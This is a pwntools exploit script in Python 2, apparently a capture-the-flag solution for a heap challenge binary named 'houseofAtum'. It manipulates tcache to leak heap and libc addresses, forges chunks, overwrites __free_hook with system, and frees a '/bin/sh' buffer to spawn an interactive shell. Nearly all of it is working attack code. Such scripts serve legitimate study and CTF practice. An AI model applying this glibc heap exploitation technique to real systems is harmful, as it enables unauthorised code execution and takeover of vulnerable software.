#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './houseofAtum'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def c(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(":", idx)
            f(*args, **kargs)
        return go
    return wrap


@c(1)
def new(content):
    sa(":", content)

@c(2)
def edit(idx, content):
    sla(":", idx)
    sa(":", content)

@c(4)
def show(idx):
    sla(":",  idx)

@c(3)
def delete(idx, choice):
    sla(":", idx)
    sla(":", choice)

def raddr(a=6):
    if(a==6):
        return u64(r(a).ljust(8,'\x00'))
    else:
        return u64(rl().ljust(8,'\x00'))


def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new("1") #0
    new("1") #1
    delete(1, 'y')
    delete(0, 'y')
    new("1") #0
    show(0)
    ru('tent:')
    heap_addr = uu64(r(6)) - 0x231
    lg("heap", heap_addr)

    delete(0, 'y')
    payload = flat([
        p64(0)*7,
        p64(0x61),
        p64(heap_addr + 0x68),
    ])
    new(payload) #0
    new("123") #1
    for i in range(7):
        delete(0, 'n')
    delete(1, 'y')
    delete(0, 'y')
    new("123") # a--0
    new("123") # b--1

    delete(1, 'y')  # free fake
    # here we can get any address write
    new(p64(0x0)) #1 set 0 for new others
    edit(0, p64(0)*3 + p64(0xa1)) # for unsortedbin
    delete(0,'y')

    # fill the 0x50, tcache
    edit(1,p64(0))
    new("123")
    delete(0,'y')
    edit(1,p64(0))
    # spray a couple of 0x21's to bypass _int_free's checks
    # see https://github.com/str8outtaheap/heapwn/blob/master/malloc/_int_free.c#L59
    new(p64(0x21)*9)
    delete(0,'y')
    
    # fill the 0xa0 tcache
    edit(1,p64(heap_addr+0x280))
    new("123")
    for i in range(0x7):
        delete(0,'n')
    # get unsortedbin
    delete(0,'y')
    # leak address
    edit(1,p64(heap_addr+0x260))
    new("A"*0x20)
    show(0)
    ru("A"*0x20)
    libc_addr=raddr()-0x3ebca0
    lg("Libc address",libc_addr)
    libc.address=libc_addr
    delete(0,'y')

    # modify __delete_hook
    edit(1,p64(libc.symbols['__free_hook']))
    new(p64(libc.symbols['system']))
    edit(1,'/bin/sh\x00')
    sla("choice:",str(3))
    sla(":",str(1))
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    delete_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

